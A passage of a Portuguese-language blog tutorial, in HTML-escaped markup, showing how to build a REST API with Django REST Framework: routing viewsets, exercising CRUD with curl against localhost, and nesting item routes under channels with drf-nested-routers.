/static/767c61c3f85f83779b4b72b19b2e65d7/4ecad/hyperdrive.jpg 384w,
/static/767c61c3f85f83779b4b72b19b2e65d7/07f3a/hyperdrive.jpg 740w&quot;
        sizes=&quot;(max-width: 740px) 100vw, 740px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Usar DRF é como entrar em hyperdrive (pinpointe.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Uma das vantagens de utilizar um &lt;em&gt;viewset&lt;/em&gt; é que ele também se encarrega de fazer o mapeamento das &lt;em&gt;URLs&lt;/em&gt;. Por exemplo, o &lt;code class=&quot;language-text&quot;&gt;ChannelViewSet&lt;/code&gt; uma vez que mapeado,
responderá para rotas terminando em &lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;/&amp;lt;id-do-channel&amp;gt;&lt;/code&gt;. Além disso compreenderá que um &lt;code class=&quot;language-text&quot;&gt;POST&lt;/code&gt; em &lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt; é relacionado à criação de um novo elemento, bem como &lt;code class=&quot;language-text&quot;&gt;DELETE&lt;/code&gt; em &lt;code class=&quot;language-text&quot;&gt;/&amp;lt;id-do-channel&amp;gt;&lt;/code&gt; está relação à remoção:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# urls.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; path

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; rest_framework &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; routers
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; channels&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;api &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; ChannelViewSet

api_router &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; routers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DefaultRouter&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
api_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;register&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&quot;channels&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ChannelViewSet&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    path&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;api/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;api_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nesse momento já é possível presenciar um resultado mais sólido ao acessar &lt;code class=&quot;language-text&quot;&gt;http://localhost:8000/api&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 740px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0a797ad2b8417bd9a2e5f88cd3c3a1b0/50383/django-rest-framework-example.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 54.6875%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAABYlAAAWJQFJUiTwAAABj0lEQVQoz32R2UrDUBCG+yYa8UahthVv1Noaalu3otblxmcS8RkEn8HaNHF5ABFEhEosiCbaJmma5WxZnKR1K9LDx89wmG/mwElslPfy2fVyYYfPra8sV9aK1VJhu5DfzC2ufrO0UC7kKyW+srtR4osHayvVIr8FPYn02Pj81DSfzuRT6WwymZtJzU1OZriJ2b9kOC6+hOQGN+NcQpQkQRTP63VBEqEALgShVq/XhGEaYkOSGmKckiQ2Li8TYRgGQUApDXw/HHlMEr47fpeGCiSOmiNZVVVZlpvNpqIovu8zRhljUAQwL04vnnty0zo8uzu6kvdPb4+v5YFsmr23N6Xd7miarutGJzoapeCHnhfpfQIgCKJ3+nH2ZcdxwXFdzAijmBJMESIjgE4YPdgMe+7vH55ary9ts/VudC0XI/IDHgahX7LW0R6fWs9KWzVstWvrlosIHfDfK2AzIV8yoQybDjFs0rWpYRG9hz6MiI6JDAvhkTJlHrYR6TnYwcRyoSBmDBQOgr4hMIbf8ED8BMauEY/dCRS/AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Exemplo ao acessar o endereço no browser&quot;
        title=&quot;Exemplo ao acessar o endereço no browser&quot;
        src=&quot;/static/0a797ad2b8417bd9a2e5f88cd3c3a1b0/50383/django-rest-framework-example.png&quot;
        srcset=&quot;/static/0a797ad2b8417bd9a2e5f88cd3c3a1b0/8514f/django-rest-framework-example.png 192w,
/static/0a797ad2b8417bd9a2e5f88cd3c3a1b0/804b2/django-rest-framework-example.png 384w,
/static/0a797ad2b8417bd9a2e5f88cd3c3a1b0/50383/django-rest-framework-example.png 740w&quot;
        sizes=&quot;(max-width: 740px) 100vw, 740px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Exemplo ao acessar o endereço no browser&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Não ligue para a porta &lt;code class=&quot;language-text&quot;&gt;:5000&lt;/code&gt; no exemplo acima...&lt;/p&gt;
&lt;p&gt;Se você não é fã do &lt;em&gt;browsable api&lt;/em&gt;, e não quer ter essa visão do &lt;code class=&quot;language-text&quot;&gt;API Root&lt;/code&gt; (como da imagem acima), troque o &lt;code class=&quot;language-text&quot;&gt;DefaultRouter&lt;/code&gt; por &lt;code class=&quot;language-text&quot;&gt;SimpleRouter&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;CRUD em ação&lt;/h2&gt;
&lt;p&gt;Considerando tudo o que foi dito até então, podemos esperar que temos o recurso mapeado no endereço &lt;code class=&quot;language-text&quot;&gt;http://localhost:8000/api/channels&lt;/code&gt;,
e que a partir desse, poderemos desempenhar a listagem, adição, edição e exclusão de dados desse recurso.&lt;/p&gt;
&lt;p&gt;Começamos então adicionando um elemento, ao enviar o método &lt;code class=&quot;language-text&quot;&gt;POST&lt;/code&gt; para o endereço com final &lt;code class=&quot;language-text&quot;&gt;channels/&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl -XPOST http://localhost:8000/api/channels/ --data &amp;#39;{
    &amp;quot;id&amp;quot;: 1,
    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,
    &amp;quot;description&amp;quot;: &amp;quot;Python, Django e desenvolvimento Web&amp;quot;,
    &amp;quot;link&amp;quot;: &amp;quot;https://klauslaube.com.br&amp;quot;
}&amp;#39; --header &amp;quot;Content-Type: application/json&amp;quot;

{&amp;quot;id&amp;quot;:1,&amp;quot;title&amp;quot;:&amp;quot;Klaus Laube&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Python, Django e desenvolvimento Web&amp;quot;,&amp;quot;link&amp;quot;:&amp;quot;https://klauslaube.com.br&amp;quot;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Como o serializador espelha as propriedades do modelo &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt;, caso um campo obrigatório não seja enviado
no &lt;em&gt;payload&lt;/em&gt;, o próprio serializador se encarregará de fazer essa validação e de retornar detalhes do erro ao usuário:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl -i -XPOST http://localhost:8000/api/channels/ --data &amp;#39;{
    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,
    &amp;quot;description&amp;quot;: &amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;
}&amp;#39; --header &amp;quot;Content-Type: application/json&amp;quot;

HTTP/1.1 400 Bad Request
Date: Tue, 11 Feb 2020 18:00:44 GMT
Server: WSGIServer/0.2 CPython/3.7.2
Content-Type: application/json
Vary: Accept, Cookie
Allow: GET, POST, HEAD, OPTIONS
X-Frame-Options: DENY
Content-Length: 36
X-Content-Type-Options: nosniff

{&amp;quot;link&amp;quot;:[&amp;quot;This field is required.&amp;quot;]}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Como estamos falando de uma &lt;em&gt;API&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;, é normal esperarmos que um &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; no mesmo endereço traga uma lista de &lt;em&gt;channels&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl http://localhost:8000/api/channels/

[{&amp;quot;id&amp;quot;:1,&amp;quot;title&amp;quot;:&amp;quot;Klaus Laube&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Python, Django e desenvolvimento Web&amp;quot;,&amp;quot;link&amp;quot;:&amp;quot;https://klauslaube.com.br&amp;quot;}]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E normalmente, um &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; em &lt;code class=&quot;language-text&quot;&gt;channels/1&lt;/code&gt; deve trazer detalhes daquele recurso:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl http://localhost:8000/api/channels/1/

{&amp;quot;id&amp;quot;:1,&amp;quot;title&amp;quot;:&amp;quot;Klaus Laube&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Python, Django e desenvolvimento Web&amp;quot;,&amp;quot;link&amp;quot;:&amp;quot;https://klauslaube.com.br&amp;quot;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Para atualizar o registro, enviamos o método &lt;code class=&quot;language-text&quot;&gt;PUT&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl -XPUT http://localhost:8000/api/channels/1/ --data &amp;#39;{
    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,
    &amp;quot;description&amp;quot;: &amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;,
    &amp;quot;link&amp;quot;: &amp;quot;https://klauslaube.com.br&amp;quot;
}&amp;#39; --header &amp;quot;Content-Type: application/json&amp;quot;

{&amp;quot;id&amp;quot;:1,&amp;quot;title&amp;quot;:&amp;quot;Klaus Laube&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;,&amp;quot;link&amp;quot;:&amp;quot;https://klauslaube.com.br&amp;quot;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E para finalizar, com &lt;code class=&quot;language-text&quot;&gt;DELETE&lt;/code&gt; é possível remover o recurso:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl -XDELETE http://localhost:8000/api/channels/2/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mágico, não?!&lt;/p&gt;
&lt;h2&gt;Serializando relacionamentos&lt;/h2&gt;
&lt;p&gt;Passaremos a abordar agora a construção do &lt;em&gt;endpoint&lt;/em&gt; para o recurso &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 640px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/71dd224a33c9c79420baf43984fa2225/c08c5/vim-jedi.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAGAAAAgMAAAAAAAAAAAAAAAAAAAUCAwT/xAAWAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAVzVJo0VJAo//8QAGhAAAgMBAQAAAAAAAAAAAAAAAAMBAhESE//aAAgBAQABBQJGejGdVKjJnD//xAAXEQADAQAAAAAAAAAAAAAAAAABAhAR/9oACAEDAQE/AQ2T/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAGhAAAgIDAAAAAAAAAAAAAAAAAAEQESFBQv/aAAgBAQAGPwLJfK1CFH//xAAYEAADAQEAAAAAAAAAAAAAAAAAARExIf/aAAgBAQABPyFmQRbUJWtm6KuhpF4I/9oADAMBAAIAAwAAABBY7//EABYRAQEBAAAAAAAAAAAAAAAAAAEREP/aAAgBAwEBPxARJn//xAAWEQEBAQAAAAAAAAAAAAAAAAARAAH/2gAIAQIBAT8Q10m//8QAHBABAQACAgMAAAAAAAAAAAAAAREAITFhQVGB/9oACAEBAAE/ELpIjVKHeBMI1/AHveaSja5xjbu/ccHsgBcTOc//2Q==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Kylo vs Rey&quot;
        title=&quot;Nem o DRF consegue serializar o relacionamento entre Rey e Kylo (jovemnerd.com.br)&quot;
        src=&quot;/static/71dd224a33c9c79420baf43984fa2225/c08c5/vim-jedi.jpg&quot;
        srcset=&quot;/static/71dd224a33c9c79420baf43984fa2225/7809d/vim-jedi.jpg 192w,
/static/71dd224a33c9c79420baf43984fa2225/4ecad/vim-jedi.jpg 384w,
/static/71dd224a33c9c79420baf43984fa2225/c08c5/vim-jedi.jpg 640w&quot;
        sizes=&quot;(max-width: 640px) 100vw, 640px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Nem o DRF consegue serializar o relacionamento entre Rey e Kylo (jovemnerd.com.br)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Começamos pelo &lt;em&gt;serializer&lt;/em&gt;, que não é muito diferente do construído anteriormente para o modelo &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ItemSerializer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;serializers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ModelSerializer&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Meta&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        model &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Item
        fields &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;__all__&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;ModelSerializer&lt;/code&gt; &quot;automagicamente&quot; fará o &lt;em&gt;parsing&lt;/em&gt; do relacionamento entre &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt;. O resultado da serialização de uma instância
de &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt; terá uma propriedade &lt;code class=&quot;language-text&quot;&gt;channel&lt;/code&gt;, com a chave primária do elemento relacionado como valor:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;(...)

&amp;gt;&amp;gt;&amp;gt; item = Item.objects.first()
&amp;gt;&amp;gt;&amp;gt; serializer = ItemSerializer(item)
&amp;gt;&amp;gt;&amp;gt; data = serializer.data

&amp;gt;&amp;gt;&amp;gt; print(data[&amp;quot;channel&amp;quot;])
1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Antes de passarmos para o &lt;em&gt;viewset&lt;/em&gt;, vamos discutir como ficará a &lt;em&gt;URL&lt;/em&gt; desse recurso. Se seguirmos a mesma receita utilizada para &lt;code class=&quot;language-text&quot;&gt;Channel&lt;/code&gt;,
teremos um endereço semelhante com o abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://localhost:8000/api/items/&amp;lt;id&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mas que tal se &lt;code class=&quot;language-text&quot;&gt;channels&lt;/code&gt; fosse parte da &lt;em&gt;URL&lt;/em&gt; de &lt;code class=&quot;language-text&quot;&gt;items&lt;/code&gt;? É possível atingir tal resultado com o conceito de recurso aninhado.&lt;/p&gt;
&lt;h2&gt;Nested resources&lt;/h2&gt;
&lt;p&gt;O que queremos, na prática, é o seguinte:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;http://localhost:8000/api/channels/&amp;lt;id-do-channel&amp;gt;/items/&amp;lt;id-do-item&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Com isso, ao acessar &lt;code class=&quot;language-text&quot;&gt;channels/1/items&lt;/code&gt; (por exemplo), teremos uma listagem de todos os itens relacionados
com o canal &lt;code class=&quot;language-text&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Infelizmente o &lt;em&gt;DRF&lt;/em&gt; não possui nenhuma &quot;classe mágica&quot; que faça isso acontecer com poucas linhas de código. Estratégias
para atingir o mesmo resultado podem variar. Existe uma biblioteca que integra-se com o &lt;em&gt;DRF&lt;/em&gt; e produz um resultado
similar ao que queremos. Estou falando da &lt;a href=&quot;https://github.com/alanjds/drf-nested-routers&quot; title=&quot;Veja o repositório do projeto&quot;&gt;&lt;em&gt;drf-nested-routers&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pipenv install drf-nested-routers&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Fica o &lt;em&gt;disclaimer&lt;/em&gt;:&lt;/strong&gt; Como o próprio autor da biblioteca salienta na documentação, essa é uma ferramenta em estado experimental, portanto,
cogite alternativas quando estiver fazendo o &lt;em&gt;deploy&lt;/em&gt; do código para produção. Para provar o conceito apresentado nesse &lt;em&gt;post&lt;/em&gt;, ela serve
perfeitamente.&lt;/p&gt;
&lt;p&gt;Agora sim podemos continuar com o desenvolvimento do recurso &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/api.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ItemViewSet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;viewsets&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ModelViewSet&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    serializer_class &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ItemSerializer

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;get_queryset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
            channel&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kwargs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;channel_pk&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note a sobrescrita do método &lt;code class=&quot;language-text&quot;&gt;get_queryset&lt;/code&gt;. O parâmetro &lt;code class=&quot;language-text&quot;&gt;channel_pk&lt;/code&gt; será passado para o &lt;code class=&quot;language-text&quot;&gt;ItemViewSet&lt;/code&gt; no momento
em que registrarmos a classe no &lt;code class=&quot;language-text&quot;&gt;Router&lt;/code&gt;. Com isso, de forma &quot;lazy&quot;, estamos dizendo que os items pesquisados
devem ser relacionados com o &lt;code class=&quot;language-text&quot;&gt;channel&lt;/code&gt; mencionado no &lt;em&gt;path&lt;/em&gt; do endereço acessado.&lt;/p&gt;
&lt;p&gt;De volta ao &lt;code class=&quot;language-text&quot;&gt;urls.py&lt;/code&gt;, atualizaremos o roteamento para ficar semelhante com o exemplo abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# urls.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; path
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; rest_framework_nested &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; routers

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; channels&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;api &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; ChannelViewSet&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ItemViewSet

api_router &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; routers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DefaultRouter&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
api_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;register&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&quot;channels&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ChannelViewSet&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

channels_router &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; routers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;NestedDefaultRouter&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    api_router&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;r&quot;channels&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; lookup&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;channel&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
channels_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;register&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;r&quot;items&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ItemViewSet&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    basename&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;channel-items&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

urlpatterns &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
